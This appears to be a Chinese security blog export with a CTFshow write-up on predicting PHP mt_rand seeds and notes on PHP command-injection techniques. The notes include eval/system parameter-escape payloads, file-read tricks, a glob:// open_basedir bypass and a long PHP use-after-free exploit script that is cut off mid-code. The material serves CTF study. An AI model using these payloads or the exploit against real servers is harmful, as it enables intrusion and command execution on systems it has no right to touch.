../../auth/gensec/spnego.c:1445(gensec_spnego_server_negTokenTarg_step)</span><br><span class="line">  gensec_spnego_server_negTokenTarg_step: SPNEGO(ntlmssp) login failed: NT_STATUS_WRONG_PASSWORD</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210911190645705.png" alt="image-20210911190645705"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://cn.linux.vbird.org/linux_server/0370samba_1.php">第十六章、文件服务器之二： SAMBA 服务器</a></p><p><a href="https://cshihong.github.io/2018/10/18/Samba%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/">Samba服务器搭建与配置</a></p><p><a href="https://blog.csdn.net/sinat_35850783/article/details/100776590">samba启动失败</a></p><p><a href="https://blog.51cto.com/1992tao/1863682">文件共享服务—Samba</a></p><p><a href="https://huiliu.github.io/2016/01/19/samba_basic.html">Samba</a></p>]]></content>
      
      
      <categories>
          
          <category> 主机安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mt_srand()种子和mt_rand()随机数</title>
      <link href="/p/730fc708.html"/>
      <url>/p/730fc708.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>来自CTFSshow-WEB24</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    mt_srand(hexdec(substr(md5(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = intval(<span class="variable">$r</span>)-intval(mt_rand());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&#x27;cat /proc/version&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>先测试<code>r=0</code>,网页回显<code>-1387662750</code>，得到随机数<code>mt_rand()=1387662750</code></p><p>由于要让<code>!$rand</code>条件成立，获取flag的<code>r=1387662750</code></p><p><a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">php_mt_seed 4.0</a></p><p>下载编译</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909124135307.png" alt="image-20210909124135307"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909124106797.png" alt="image-20210909124106797"></p><p>在<code>mt_rand()</code>相加前，<code>intval($r)-intval(mt_rand());</code>就调用过一次<code>mt_rand()</code>，所以才有中间的，<code>echo mt_rand().&quot;\n&quot;;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">2704363133</span>);</span><br><span class="line"><span class="keyword">echo</span> mt_rand().<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> mt_rand()+mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>添加cookie到数据包</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909124222921.png" alt="image-20210909124222921"></p><h2 id="题目原理"><a href="#题目原理" class="headerlink" title="题目原理"></a>题目原理</h2><p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。</p><p>生成伪随机数是线性的，你可以理解为y=ax,x就是种子，知道种子和一组伪随机数不是就可以推y(伪随机数）</p><p>如题目，让<code>r=0</code>就知道y的第一个确定值，通过爆破a，就能确定种子</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210909125628570.png" alt="image-20210909125628570"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/zaqzzz/p/9997855.html">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php命令执行</title>
      <link href="/p/604e4b25.html"/>
      <url>/p/604e4b25.html</url>
      
        <content type="html"><![CDATA[<p>应用有时需要调用一些执行系统命令的函数，如PHP中的<code>system</code>、<code>exec</code>、<code>shell_exec</code>、 <code>passthru</code>、<code>popen</code>、<code>proc_popen</code>等，当用户能控制这些函数中的参数时，就可以将恶意系统命令 拼接到正常命令中，从而造成命令执行攻击。</p><p><a href="http://php.net/manual/zh/ref.exec.php">PHP程序执行函数</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</span><br><span class="line">escapeshellcmd — shell 元字符转义</span><br><span class="line">exec — 执行一个外部程序</span><br><span class="line">passthru — 执行外部程序并且显示原始输出</span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码</span><br><span class="line">proc_get_status — 获取由 proc_open 函数打开的进程的信息</span><br><span class="line">proc_nice — 修改当前进程的优先级</span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。</span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程</span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line">system — 执行外部程序，并且显示输出</span><br></pre></td></tr></table></figure><h2 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h2><ul><li><p>代码层过滤不严</p><ul><li>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：<code>system(&quot;/bin/program –arg $arg&quot;);</code></li></ul></li><li><p>系统的漏洞造成命令注入</p><ul><li>bash破壳漏洞(CVE-2014-6271)</li></ul></li><li><p>调用的第三方组件存在代码执行漏洞</p><ul><li>如WordPress中用来处理图片的ImageMagick组件</li><li>JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)</li><li>ThinkPHP命令执行</li></ul></li></ul><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li><p>应用调用执行系统命令的函数</p></li><li><p>将用户输入作为系统命令函数的参数拼接到了命令行中</p></li><li><p>没有对用户输入进行过滤或过滤不严</p></li></ul><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ul><li><p>继承Web服务程序的权限去执行系统命令或读写文件</p></li><li><p>反弹shell</p></li><li><p>控制整个网站甚至控制服务器</p></li><li><p>进一步内网渗透</p></li></ul><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h3 id="windows管道符"><a href="#windows管道符" class="headerlink" title="windows管道符"></a>windows管道符</h3><p><code>|</code>直接执行后面的语句。</p><p><code>||</code>如果前面的语句执行失败，则执行后面的语句，<strong>前面的语句只能为假</strong>。</p><p><code>&amp;</code>两条命令都执行，如果前面的语句为假则直接执行后面的语句，<strong>前面的语句可真可假</strong>。</p><p><code>&amp;&amp;</code>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，<strong>前面的语句只能为真</strong>。</p><h3 id="linux管道符"><a href="#linux管道符" class="headerlink" title="linux管道符"></a>linux管道符</h3><p><code>;</code>执行完前面的语句再执行后面的语句。</p><p><code>|</code><strong>显示</strong>后面语句的执行结果。</p><p><code>||</code>当前面的语句执行出错时，执行后面的语句，<strong>前面的语句只能为假</strong>。</p><p><code>&amp;</code>两条命令都执行，如果前面的语句为假则执行执行后面的语句，<strong>前面的语句可真可假</strong>。</p><p><code>&amp;&amp;</code>如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，<strong>前面的语句只能为真</strong>。</p><h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号(``)"></a>反引号<code>(``)</code></h2><p>注意这不是单引号！PHP 将尝试将<strong>反引号中的内容作为 shell 命令来执行</strong>，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符的效果与函数 <code>shell_exec()</code> 相同。</p><h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><p><code>&lt;? php</code> 可替换为 <code>&lt;?=</code></p><p>在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。</p><p>所以就需要构造<code>?&gt;&lt;?=ls;</code></p><h2 id="传参逃逸"><a href="#传参逃逸" class="headerlink" title="传参逃逸"></a>传参逃逸</h2><p><code>1=</code>后出现的命令可以不受影响</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913205727442.png" alt="image-20210913205727442"></p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="php函数读取系统文件"><a href="#php函数读取系统文件" class="headerlink" title="php函数读取系统文件"></a>php函数读取系统文件</h2><table><thead><tr><th>函数</th><th>是否需要echo</th></tr></thead><tbody><tr><td>file_get_content()</td><td>需要</td></tr><tr><td>readfile()</td><td></td></tr><tr><td>highlight_file()</td><td>不需要</td></tr><tr><td>show_source()</td><td>不需要</td></tr><tr><td>include()</td><td>不需要，需要echo变量</td></tr></tbody></table><p><strong>include包含,echo输出</strong></p><p><code>c=include(&#39;flag.php&#39;);echo $flag.php;</code></p><p><strong>当不知道变量名称</strong>，包含后输出所有变量名称</p><p><code>c=include(&#39;flag.php&#39;);var_dump(get_defined_vars());</code></p><p><strong>写shell到文件日志文件中，读取日志文件拿shell</strong></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210913211117029.png" alt="image-20210913211117029"></p><h3 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h3><p>open_basedir 将php所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</p><h4 id="glob-伪协议绕过open-basedir"><a href="#glob-伪协议绕过open-basedir" class="headerlink" title="glob://伪协议绕过open_basedir"></a>glob://伪协议绕过open_basedir</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>需要url编码</p></blockquote><h4 id="uaf脚本"><a href="#uaf脚本" class="headerlink" title="uaf脚本"></a>uaf脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    